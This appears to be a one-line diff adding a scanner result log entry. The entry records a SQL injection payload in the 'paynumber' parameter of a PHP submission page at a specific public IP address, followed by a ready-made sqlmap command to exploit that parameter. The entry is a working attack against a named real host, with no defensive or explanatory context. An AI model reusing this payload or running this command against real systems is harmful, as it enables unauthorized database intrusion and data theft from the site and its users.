@@ -1,0 +1,1 @@
+http://129.211.167.186:80/other/submit.php?paynumber=-1'%20OR%203*2*1=6%20AND%20000670=000670%20--%20 (GET)  # "D:\Program Files\Python\Python311\Scripts\sqlmap" -r sqlmap_requests\006_SQL_Injection_paynumber_3883883625518729183.txt --batch --smart --random-agent --output-dir sqlmap_output\006_3883883625518729183 -p paynumber
